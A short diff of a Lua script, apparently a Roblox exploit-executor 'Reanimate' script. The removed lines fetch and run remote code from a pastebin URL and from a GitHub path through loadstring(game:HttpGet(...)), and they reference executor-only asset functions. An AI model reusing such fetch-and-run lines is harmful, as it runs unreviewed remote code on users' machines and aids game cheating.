@@ -1,9 +1,3 @@
---Reanimate
-loadstring(game:HttpGet("https://pastebin.com/raw/YBMWtriH"))()
- 
-lol = getcustomasset or getsynasset
-getgenv().LoadLibrary = function(lib) return loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox/Core-Scripts/master/CoreScriptsRoot/Libraries/" .. lib .. ".lua"))() end
-
 local p=game:service("Players").LocalPlayer
 local char=p.Character
 script.Parent=char 
